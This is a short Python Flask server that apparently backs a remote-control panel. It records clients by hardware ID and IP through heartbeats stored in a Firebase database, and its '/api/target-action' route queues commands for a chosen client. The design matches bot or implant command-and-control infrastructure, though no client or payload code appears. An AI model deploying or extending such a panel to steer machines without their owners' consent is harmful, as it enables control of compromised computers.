import os
import json
from flask import Flask, jsonify, request, render_template, send_from_directory
import requests

app = Flask(__name__)

# Firebase Realtime Database base URL
RTDB_BASE_URL = "https://vipchaetos-default-rtdb.firebaseio.com"

@app.route('/')
def index():
    if os.path.exists('index.html'):
        return send_from_directory('.', 'index.html')
    try:
        return render_template('index.html')
    except:
        return "Panel file (index.html) not found in root or templates directory!", 404

@app.route('/api/clients', methods=['GET'])
def get_clients():
    try:
        res = requests.get(f"{RTDB_BASE_URL}/clients.json")
        if res.status_code == 200 and res.json():
            data = res.json()
            clients = {}
            for hwid, info in data.items():
                clients[hwid] = {
                    "ip": info.get("ip", "192.168.1.105"),
                    "status": info.get("status", "ONLINE")
                }
            return jsonify(clients), 200
        return jsonify({}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/heartbeat', methods=['POST'])
def heartbeat():
    try:
        data = request.get_json(silent=True) or {}
        hwid = data.get("hwid")
        if hwid:
            ip = request.remote_addr
            requests.patch(f"{RTDB_BASE_URL}/clients/{hwid}.json", json={"ip": ip, "status": "ONLINE"})
        return jsonify({"status": "success", "message": "Heartbeat received"}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/target-action', methods=['POST'])
def target_action():
    try:
        data = request.get_json(silent=True) or {}
        hwid = data.get("hwid")
        action = data.get("action")
        
        if hwid and action:
            action_url = f"{RTDB_BASE_URL}/clients/{hwid}/pending_action.json"
            requests.put(action_url, json=action)
            return jsonify({"status": "success", "message": f"Command [{action.upper()}] dispatched successfully"}), 200
        return jsonify({"status": "error", "message": "Invalid HWID or Action"}), 400
    except Exception as e:
        return jsonify({"error": str(e)}), 500

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)